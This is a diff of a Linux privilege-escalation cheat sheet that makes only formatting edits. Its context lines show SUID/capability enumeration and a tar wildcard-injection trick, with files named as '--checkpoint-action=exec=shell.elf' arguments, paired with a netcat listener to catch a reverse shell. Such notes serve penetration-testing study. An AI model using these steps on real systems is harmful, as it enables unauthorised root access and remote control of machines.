@@ -69,7 +69,7 @@ awk -F: '$3 >= 1000 {print $1}' /etc/passwd | wc -l
 ```
 ## SUID_SGID_Capabilities_Files_enumeration ✅
 ```
-getcap -r / 2>/dev/null
+getcap -r / 2>/dev/null # Capabilities enumeration
 find / -perm -02000 -ls 2>/dev/null
 find / -perm -04000 -ls 2>/dev/null
 find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2> /dev/null
@@ -184,12 +184,15 @@ touch /home/user/--checkpoint=1 # target machine
 touch /home/user/--checkpoint-action=exec=shell.elf # target machine
 nc -nvlp 4444 # our kali
 ```
-## SUID_SGID ✅
+## **SUID_SGID** ✅
 ### Known Exploits ✡️
 ```bash
 searchsploit <name app>
 ```
 ### **Symlinks** ✡️
+```bash
+```
+
 ### Shared Object Injection ✡️
 ```bash
 file /usr/local/bin/suid-so # setuid setgid ELF 64-bit LSB executable
